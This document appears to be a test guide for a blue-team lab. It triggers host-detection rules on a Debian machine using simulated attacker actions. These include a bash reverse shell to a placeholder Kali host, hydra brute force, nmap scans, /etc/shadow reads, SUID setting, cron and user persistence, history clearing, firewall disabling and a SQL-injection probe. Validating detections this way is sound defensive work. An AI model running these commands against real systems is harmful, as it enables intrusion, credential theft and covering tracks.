# Linux Test Suite

## Automated Run (Recommended)
Run from the extracted bundle on the Debian/Linux host:
```bash
sudo bash scripts/test-linux-detections.sh <KALI_IP>
```
- Runs all local host detections and cleans up temporary files/users automatically.
- Pauses and prints the exact **Kali** commands for reverse shell (`102009`), SSH brute force (`102002`), Nmap (`102017`/`102019`), and optional root SSH (`102003`, auto-reverting `PermitRootLogin`).

---

## 1. Individualized Tests (Included in Script)

### 1. Host Discovery (`102013`)
```bash
whoami; uname -a; cat /etc/passwd >/dev/null; ss -tulpn >/dev/null
```
- **Check**: `rule.id:102013` (Level 7)

### 2. Temp & Hidden Dot-Directory Execution (`102008`, `102022`)
```bash
printf '#!/bin/sh\nid\n' > /tmp/redteam_bin.sh && chmod +x /tmp/redteam_bin.sh && /tmp/redteam_bin.sh && rm -f /tmp/redteam_bin.sh
mkdir -p /tmp/.ccdc_hidden && printf '#!/bin/sh\nid\n' > /tmp/.ccdc_hidden/run.sh && chmod +x /tmp/.ccdc_hidden/run.sh && /tmp/.ccdc_hidden/run.sh && rm -rf /tmp/.ccdc_hidden
```
- **Check**: `rule.id:(102008 OR 102022)` (Level 12)

### 3. Parent -> Shell Reverse Shell Pattern (`102018`)
```bash
python3 -c 'import subprocess; subprocess.run(["/bin/sh", "-c", "id"])'
```
- **Check**: `rule.id:102018` (Level 12)

### 4. Persistence, `su` to Root & Account Manipulation (`102001`, `102004`, `102006`, `102010`, `102030`, `5901`, `5902`)
```bash
su - root -c "id >/dev/null"
sudo touch /etc/cron.d/redteam_test /var/spool/cron/redteam_test && sudo useradd testred && sudo mkdir -p /root/.ssh && sudo touch /root/.ssh/authorized_keys
sudo rm -f /etc/cron.d/redteam_test /var/spool/cron/redteam_test && sudo userdel testred
```
- **Check**: `rule.id:(102001 OR 102004 OR 102006 OR 102010 OR 102030 OR 5902)` (Level 8–12)

### 5. `/etc/shadow` Read & SUID Abuse (`102012`)
```bash
sudo cat /etc/shadow >/dev/null
cp /bin/true /tmp/suid_test && sudo chmod +s /tmp/suid_test && rm -f /tmp/suid_test
```
- **Check**: `rule.id:102012` (Level 12)

### 6. Archive Staging (`102014`)
```bash
tar -czf /tmp/loot_test.tar.gz /etc/passwd 2>/dev/null && rm -f /tmp/loot_test.tar.gz
```
- **Check**: `rule.id:102014` (Level 10)

### 7. Package Management (`102005`)
```bash
sudo apt-get install -y sl && sudo apt-get remove -y sl
```
- **Check**: `rule.id:102005` (Level 7)

### 8. Reverse Shell (`102009`) + Live Port/Process Check
On **Kali**: `nc -lvnp 4444`  
On **Debian**:
```bash
bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
```
- **Check**: `rule.id:102009` (Level 11) + **Dev Tools**: `GET /syscollector/000/ports?remote.ip=<KALI_IP>`

### 9. SSH Brute Force (`102002`) & Nmap Port Scan (`102017`, `102019`)
On **Kali**:
```bash
hydra -l fakeuser -P /usr/share/wordlists/fasttrack.txt -t 4 -f ssh://<DEBIAN_IP>
nmap -Pn -p 1-50 <DEBIAN_IP>
```
- **Check**: `rule.id:(102002 OR 102017 OR 102019)` (Requires `ufw logging on` / `firewalld` for `102017`/`102019`)

### 10. Root SSH Login (`102003`)
Temporarily set `PermitRootLogin yes` in `/etc/ssh/sshd_config`, `sudo systemctl restart ssh`, run `ssh root@<DEBIAN_IP>` from Kali, then revert.
- **Check**: `rule.id:102003` (Level 12, `data.srcip`)

---

## 2. Manual / Additional Tests (Outside Script)

- **Tampering, LKM, Download, Keylogger & Password (`102031`–`102034`, `102038`)** *(also included in Step 8 of script)*:
  - `102031`: `bash -c 'unset HISTFILE; history -c'`
  - `102032`: `sudo modprobe -n dummy`
  - `102033`: `curl -s -o /tmp/ccdc_dl_test http://127.0.0.1:9; rm -f /tmp/ccdc_dl_test`
  - `102034`: `strace -p 999999` (or `ls /dev/input/event0`)
  - `102038`: `sudo passwd -S root`
- **Service / Firewall Tampering (`102021`)**: Run `sudo systemctl stop <non_critical_svc>` or `sudo /usr/sbin/ufw disable` (re-enable immediately).
- **System Binary FIM (`102020`)**: Touch/modify a test file in `/usr/local/bin/` or verify hash changes in `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin` after a `300s` FIM scan.
- **Promiscuous Sniffer (`102035`)**: Run `sudo timeout 2 tcpdump -c 1 -i any` and confirm kernel `entered promiscuous mode` fires `102035`.
- **Rootcheck (`102036`)**: Runs every `600s` automatically (or trigger via `sudo /var/ossec/bin/agent_control -r -u 000` on manager).
- **Web / Mail / FTP / Cockpit (`102007`, `102011`, `102015`, `102016`, `102023`–`102029`, `102037`)** *(on service hosts)*:
  - `102007`: `sudo touch /var/www/html/test.php`
  - `102011` / `102029`: `sudo touch /etc/postfix/test_conf` / `sudo touch /etc/aliases`
  - `102015`: Trigger web app RCE spawning `/bin/sh`
  - `102016` / `102037`: `for i in {1..6}; do curl -s "http://<TARGET_IP>/?id=1%20union%20select%201,2,3" >/dev/null; done`
  - `102023`–`102028`: `hydra -l fakeuser -P /usr/share/wordlists/fasttrack.txt` against FTP (`21`), Mail (`25`/`143`/`993`), or Cockpit (`9090`).
- **Local Noise Suppression (`100200`–`100202`)**: Run `sudo apt-get update` and `touch /tmp/noise_test && rm -f /tmp/noise_test` — confirm **no** FIM alerts appear for `/var/lib/apt/` or `/tmp/`.
